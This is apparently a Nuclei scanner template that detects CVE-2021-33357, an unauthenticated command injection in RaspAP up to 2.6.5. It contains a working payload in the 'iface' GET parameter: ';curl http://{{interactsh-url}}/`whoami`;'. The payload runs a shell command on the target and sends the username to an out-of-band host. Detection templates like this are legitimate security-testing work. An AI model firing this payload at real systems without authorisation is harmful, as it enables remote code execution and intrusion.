id: CVE-2021-33357
info:
  author: pikpikcu,pdteam
  classification:
    cve-id: CVE-2021-33357
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
  description: 'RaspAP 2.6 to 2.6.5 allows unauthenticated attackers to execute arbitrary
    OS commands via the "iface" GET parameter in /ajax/networking/get_netcfg.php,
    when the "iface" parameter value contains special characters such as ";".

    '
  name: RaspAP <=2.6.5 - Remote Command Injection
  reference:
  - https://checkmarx.com/blog/chained-raspap-vulnerabilities-grant-root-level-access/
  - https://gist.github.com/omriinbar/52c000c02a6992c6ce68d531195f69cf
  - https://github.com/RaspAP/raspap-webgui
  - https://nvd.nist.gov/vuln/detail/CVE-2021-33357
  severity: critical
  tags: cve,cve2021,rce,raspap,oast
requests:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - GET \/([a-z-]+) HTTP
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - type: word
    words:
    - DHCPEnabled
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/ajax/networking/get_netcfg.php?iface=;curl%20http://{{interactsh-url}}/`whoami`;'
